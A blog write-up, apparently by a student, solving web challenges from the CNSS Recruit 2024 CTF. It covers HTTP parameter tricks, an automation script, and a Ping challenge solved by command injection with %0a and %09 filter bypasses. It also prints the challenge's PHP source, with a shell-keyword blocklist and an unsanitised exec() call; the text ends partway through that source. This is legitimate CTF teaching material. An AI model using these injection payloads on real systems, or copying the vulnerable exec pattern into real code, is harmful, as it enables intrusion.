<div class="blog-content-box">
    <div class="article-header-box">
        <div class="article-header">
            <div class="article-title-box">
                <h1 class="title-article" id="articleContentId">CNSS Recruit 2024 Web方向 题解WriteUp</h1>
            </div>
            <div class="article-info-box">
                    <div class="up-time">最新推荐文章于&nbsp;2024-12-27 21:08:53&nbsp;发布</div>
                <div class="article-bar-top">
                    <img class="article-type-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/original.png" alt="">
                    <div class="bar-content">
                      <a class="follow-nickName vip-name" href="https://jay17.blog.csdn.net" target="_blank" rel="noopener" title="Jay 17">Jay 17</a>
                    <img class="article-time-img article-heard-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png" alt="">
                          <span class="time blog-postTime" data-time="2024-09-11 18:32:11">于 2024-09-11 18:32:11 发布</span>
                   <div class="read-count-box">
                      <img class="article-read-img article-heard-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png" alt="">
                      <span class="read-count">阅读量2.2k</span>
                      <a id="blog_detail_zk_collection" class="un-collection" data-report-click="{&quot;mod&quot;:&quot;popu_823&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4232&quot;,&quot;ab&quot;:&quot;new&quot;}">
                          <img class="article-collect-img article-heard-img un-collect-status isdefault" style="display:inline-block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png" alt="">
                          <img class="article-collect-img article-heard-img collect-status isactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive2.png" alt="">
                          <span class="name">收藏</span>
                          <span class="get-collection" style="color: rgb(153, 153, 153);">
                              16
                          </span>
                      </a>
                      <div class="read-count-box is-like">
                        <img class="article-read-img article-heard-img" style="display:none" id="is-like-imgactive-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Active.png" alt="">
                        <img class="article-read-img article-heard-img" style="display:block" id="is-like-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png" alt="">
                        <span class="read-count" id="blog-digg-num">点赞数
                            20
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="blog-tags-box">
                    <div class="tags-box artic-tag-box">
                            <span class="label">分类专栏：</span>
                                <a class="tag-link" href="https://blog.csdn.net/jayjay___/category_12326282.html" target="_blank" rel="noopener">CTF赛事</a>
                            <span class="label">文章标签：</span>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;CNSS&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;CNSS\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=CNSS&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">CNSS</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;Web安全&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;Web安全\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=Web%E5%AE%89%E5%85%A8&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">Web安全</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;网络安全&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;网络安全\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">网络安全</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;CTF&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;CTF\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=CTF&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">CTF</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;PHP&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;PHP\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=PHP&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">PHP</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;opcode&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;opcode\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=opcode&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">opcode</a>
                                <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;python&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;python\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=python&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">python</a>
                    </div>
                </div>
                <div class="slide-content-box">
                    <div class="article-copyright">
                        <div class="creativecommons">
                            版权声明：本文为博主原创文章，遵循<a href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。
                        </div>
                        <div class="article-source-link">
                            本文链接：<a href="https://blog.csdn.net/Jayjay___/article/details/142147166" target="_blank">https://blog.csdn.net/Jayjay___/article/details/142147166</a>
                        </div>
                    </div>
                </div>
                
                <div class="operating">
                    <a class="href-article-edit slide-toggle">版权</a>
                </div>
            </div>
        </div>

    </div>
    <div id="blogHuaweiyunAdvert"><div class="column-group active" data-id="142471" data-url="https://openatomworkshop.csdn.net?utm_source=blog_detail" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.8542&quot;}">                    <div class="column-group-item ">                      <div class="item-l">                        <a class="item-target" href="javascript:;" title="开放原子开发者工作坊">                          <img class="item-target" src="https://devpress.csdnimg.cn/79de2bf0b7994defa4242ef90d5513fa.jpg" alt="">                          <span class="title item-target">                              <span>                              <span class="tit">开放原子开发者工作坊</span>                              <span class="dec">文章已被社区收录</span>                              </span>                          </span>                        </a>                      </div>                      <div class="item-r"><a class="item-target article-column-bt join-huawei-community">加入社区</a></div>                    </div>                  </div></div>
        <div id="blogColumnPayAdvert">
            <div class="column-group">
                <div class="column-group-item column-group0 column-group-item-one">
                    <div class="item-l">
                        <a class="item-target" href="https://blog.csdn.net/jayjay___/category_12326282.html" target="_blank" title="CTF赛事" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.6332&quot;}">
                            <img class="item-target" src="https://i-blog.csdnimg.cn/blog_column_migrate/012be77f6927e66a2e6f92196d8cbb9a.png?x-oss-process=image/resize,m_fixed,h_224,w_224" alt="">
                            <span class="title item-target">
                                <span>
                                <span class="tit">CTF赛事</span>
                                    <span class="dec">专栏收录该内容</span>
                                </span>
                            </span>
                        </a>
                    </div>
                    <div class="item-m">
                        <span>49 篇文章</span>
                        <span>22 订阅</span>
                    </div>
                    <div class="item-r">
                            <a class="item-target article-column-bt articleColumnFreeBt" data-id="12326282">订阅专栏</a>
                    </div>
                </div>
            </div>
        </div>
    <article class="baidu_pl">
        <div id="article_content" class="article_content clearfix">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-704d5b9767.css">
             
                <div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>文章首发于【先知社区】：https://xz.aliyun.com/t/15586</p> 
<h2><a name="t0"></a><a id="babyHTTP_3"></a>babyHTTP</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1056f4326c2f4107fc4068e4faf1363e.png" alt="image-20240807211545505"></p> 
<p>开题，<a href="https://so.csdn.net/so/search?q=Http&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=Http&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;Http\&quot;}&quot;}" data-tit="Http" data-pretit="http">Http</a>传参问题</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/b65b606056f67cf40778fdb82f37d222.png" alt="image-20240807211610189"></p> 
<pre data-index="0" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">GET：
?CNSS=hackers
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:0,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/9c090f23e150ddb822c8f8e7fc4b9d24.png" alt="image-20240807211653991"></p> 
<pre data-index="1" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">POST：
web=fun
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:1,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/29b8cf482cddb98fc8d7140ab48d5808.png" alt="image-20240807211708799"></p> 
<pre data-index="2" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">Cookie：
admin=true
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:2,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d2c823f7ace509a310f6552560f0953f.png" alt="image-20240807211742583"></p> 
<h2><a name="t1"></a><a id="PHPinfo_36"></a>PHPinfo</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/fcda77a41dffb1a7b1ed4394c161ad4b.png" alt="image-20240807211812833"></p> 
<p>开题</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d370a9da93ab7e85fc8ea4a04e0caf05.png" alt="image-20240807211834499"></p> 
<p>根据题目描述，猜测<code>phpinfo.php</code>文件有东西。</p> 
<p>phpinfo里面包含了php环境绝大部分信息，当然也有flag</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/7465ac2f00703a3788485a726eb67217.png" alt="image-20240807211906991"></p> 
<h2><a name="t2"></a><a id="_54"></a>我得再快点</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/23ebc92e3fa5ba3f4871be713b978f20.png" alt="image-20240807213557132"></p> 
<p>开题，一秒一遍，写<span class="edu-hl hl hl-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;word\&quot;:\&quot;自动化\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;word\&quot;:\&quot;自动化\&quot;}&quot;}" data-tit="自动化" data-pretit="自动化">自动化</span>脚本吧</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1a198dcbb1c3a796b019612f4a4ffc8c.png" alt="image-20240807213828675"></p> 
<p>脚本思路：</p> 
<p>获取key，<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;md5加密\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;md5加密\&quot;}&quot;}" data-tit="md5加密" data-pretit="md5加密">md5加密</a>，发送到<code>/check?value=</code></p> 
<pre data-index="3" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

<span class="token comment"># 定义要请求的URL</span>
url <span class="token operator">=</span> <span class="token string">'http://152.136.11.155:10103/'</span>
url_check <span class="token operator">=</span> <span class="token string">'http://152.136.11.155:10103/check'</span>

<span class="token comment"># 定义定时刷新的时间间隔（以秒为单位）</span>
refresh_interval <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 1秒</span>


<span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 等待页面加载</span>
        key_element <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> <span class="token string">"//p[contains(text(),'Key :')]"</span><span class="token punctuation">)</span>
        key_text <span class="token operator">=</span> key_element<span class="token punctuation">.</span>text
        key <span class="token operator">=</span> key_text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'Key : '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> key
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to fetch key from page: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">md5_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
    md5_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">send_encrypted_key</span><span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_check<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">'value'</span><span class="token punctuation">:</span> encrypted_key<span class="token punctuation">}</span><span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response from /check: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to send encrypted key: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
            <span class="token keyword">if</span> key<span class="token punctuation">:</span>
                encrypted_key <span class="token operator">=</span> md5_encrypt<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
                send_encrypted_key<span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>refresh_interval<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li><li style="color: rgb(153, 153, 153);">47</li><li style="color: rgb(153, 153, 153);">48</li><li style="color: rgb(153, 153, 153);">49</li><li style="color: rgb(153, 153, 153);">50</li><li style="color: rgb(153, 153, 153);">51</li><li style="color: rgb(153, 153, 153);">52</li><li style="color: rgb(153, 153, 153);">53</li><li style="color: rgb(153, 153, 153);">54</li><li style="color: rgb(153, 153, 153);">55</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:3,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/5743fd77b6d6d488684b7737baff0c2f.png" alt="image-20240807215255524"></p> 
<h2><a name="t3"></a><a id="Ping_130"></a>Ping</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/16ec80a1a58858b20beee4684efe0181.png" alt="image-20240807215447580"></p> 
<p>开题，是自动ping一个ip然后返回结果</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/909205fd5008cdcd9c8e700ceda2baf1.png" alt="image-20240807215922103"></p> 
<p>nl2br是一个格式整理<span class="edu-hl hl hl-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;word\&quot;:\&quot;函数\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;word\&quot;:\&quot;函数\&quot;}&quot;}" data-tit="函数" data-pretit="函数">函数</span>，在字符串中的新行（\n）之前插入换行符</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/b95b872c35faf297fd94693d056efdeb.png" alt="image-20240807222204337"></p> 
<p>这个ping函数查不到，应该是自定义函数。这题感觉猜测是在函数内部执行了ping命令，应该是用分隔符去截断做。</p> 
<p>分隔符被过滤了<code>|</code>、<code>;</code>、<code>&amp;</code>还能用<code>%0a</code></p> 
<pre data-index="4" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ip=127.0.0.1%0als
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:4,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/b9990b04f4ef60e17e97000a55d0addd.png" alt="image-20240807222148768"></p> 
<p>控股也被过滤了，用%09也就是tab绕过，读一下源码</p> 
<pre data-index="5" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ip=127.0.0.1%0acat%09index.php
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:5,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<pre data-index="6" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">validate_input</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$invalid_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"chown"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"chmod"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"echo"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$invalid_chars</span> <span class="token keyword">as</span> <span class="token variable">$invalid_char</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token variable">$invalid_char</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">ping</span><span class="token punctuation">(</span><span class="token variable">$ip_address</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">validate_input</span><span class="token punctuation">(</span><span class="token variable">$ip_address</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Error: Invalid input."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 2 "</span> <span class="token operator">.</span><span class="token variable">$ip_address</span><span class="token punctuation">;</span>
    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token variable">$return_code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


